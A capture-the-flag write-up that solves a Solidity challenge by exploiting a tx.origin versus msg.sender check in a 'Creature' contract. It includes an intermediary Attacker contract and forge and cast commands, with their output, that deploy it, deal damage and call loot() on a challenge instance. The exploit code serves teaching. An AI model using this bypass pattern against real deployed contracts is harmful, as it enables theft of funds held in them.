The challenge comes with 2 contracts:
- Setup
- Creature

The goal of the challenge is to make Creature's lp drop to 0.

Analyzing the Creature's contract we can se that in the function "attack", it takes the aggro of the attacker if it is not initialized:
Code:

    if (aggro == address(0)) {
      aggro = msg.sender;
    }

Then, it takes damage only if the attacker is different from the taken aggro:
Code:
  
    if (_isOffBalance() && aggro != msg.sender) {
      lifePoints -= _damage;
    } else {
      lifePoints -= 0;
    }

Where "_isOffBalance" function returns the result of this check:
  return tx.origin != msg.sender;

Here comes handy understand what this check is refering to:
1. tx.origin: is referred to the original address that started the tx ( in the case of contract with external function that can be called from other contract, if A calls B and B calls C, C will know that tx origin is A).
2. msg.sender: is referred to the address who made the call ( in this case if A calls B and B calls C, C will know that msg.sender is B.


Now, joining all togheter, to make damage to the Creature, we need to set the aggro and then attack with a different msg.sender.
To do so, we create a new contract that will be used to call Creature's attack function externally:
  
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;
  
    import {Creature} from "./Creature.sol";
  
    contract Attacker {
      Creature public dc;
  
      constructor(Creature _dc) {
          dc = _dc;
      }
   
      function f(uint256 _damage) external{
          dc.attack(_damage);
      }
    }


Now we deploy the contract, specifing rpc url, priv key, target address (Creature addr) and gas limit!!!:
  
    forge create src/Attacker.sol:Attacker --rpc-url http://94.237.61.26:43016/rpc --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4 --constructor-args 0x7e5338eeF14Eb414805245253eac7a334504cF98 --gas-limit 10000000
    [⠊] Compiling...
    [⠒] Compiling 1 files with 0.8.25
    [⠢] Solc 0.8.25 finished in 28.47ms
    Compiler run successful!
    Deployer: 0xed95E71815e1127054cA100ff43F2442f0fb6bBd
    Deployed to: 0x0720C9268fee5C4650F39f5804Ff76F632D47fD4
    Transaction hash: 0x17c14617e9399d7aae38c5f794ba3b0d715a60d346f0bf153004107fbbb435d7

Awesome, so the address of Attacker contract is: 0x0720C9268fee5C4650F39f5804Ff76F632D47fD4

We have now all we need to carry the attack!
In order, we attack directly calling "attack" function of Creature contract (target address):
  
    cast send -r http://94.237.61.26:43016/rpc 0x7e5338eeF14Eb414805245253eac7a334504cF98 "attack(uint256)" 1000 --gas-limit 10000000 --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4
  
    blockHash               0xe96279ce999facecf4940bcf41b52a32483b7b55639536fd704680b4cd684e6e
    blockNumber             3
    contractAddress         
    cumulativeGasUsed       46057
    effectiveGasPrice       0
    from                    0xed95E71815e1127054cA100ff43F2442f0fb6bBd
    gasUsed                 46057
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root                    
    status                  1 (success)
    transactionHash         0xdc0276e744e42aaf170279743cd0dc502d7762afe4b2503d945f554bbe48a544
    transactionIndex        0
    type                    2
    blobGasPrice            
    blobGasUsed             
    to                      0x7e5338eeF14Eb414805245253eac7a334504cF98


At this point, Creature's aggro is set with the address from which we started the tx (called Address in connections tab)
We can now attack using the Attacker contract:

    cast send -r http://94.237.61.26:43016/rpc 0x0720C9268fee5C4650F39f5804Ff76F632D47fD4 "f(uint256)" 1000 --gas-limit 10000000 --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4
  
    blockHash               0x199ac5d4448ca83f67679c3bdb173e49d8d0ac39337f7ec3fd7dee16e64717ca
    blockNumber             5
    contractAddress         
    cumulativeGasUsed       29245
    effectiveGasPrice       0
    from                    0xed95E71815e1127054cA100ff43F2442f0fb6bBd
    gasUsed                 29245
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root                    
    status                  1 (success)
    transactionHash         0xe68c2b7eac57cadc0499303379f4257e42358c7b43765fc5f42afd3173a9cc2c
    transactionIndex        0
    type                    2
    blobGasPrice            
    blobGasUsed             
    to                      0x0720C9268fee5C4650F39f5804Ff76F632D47fD4

At this point, the check "tx.origin != msg.sender" will be satisfied:
tx.origin = Address (our address who called Attacker's contract function)
msg.sender = Attacker's contract address

We can now loot:

    cast send -r http://94.237.61.26:43016/rpc 0x7e5338eeF14Eb414805245253eac7a334504cF98 "loot()" --gas-limit 10000000 --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4
    
    blockHash               0x60250c5cee3adec79cb8d7fa65cb730970aa2782d48d001468076cc9e88580dc
    blockNumber             6
    contractAddress         
    cumulativeGasUsed       30240
    effectiveGasPrice       0
    from                    0xed95E71815e1127054cA100ff43F2442f0fb6bBd
    gasUsed                 30240
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root                    
    status                  1 (success)
    transactionHash         0x0eb7367d16d5048790acadec77f2996b810ebb3d9c1489d1fabbfcbe106570b0
    transactionIndex        0
    type                    2
    blobGasPrice            
    blobGasUsed             
    to                      0x7e5338eeF14Eb414805245253eac7a334504cF98
  
Enjoy the flag at http://{RPC_URL}/flag :D
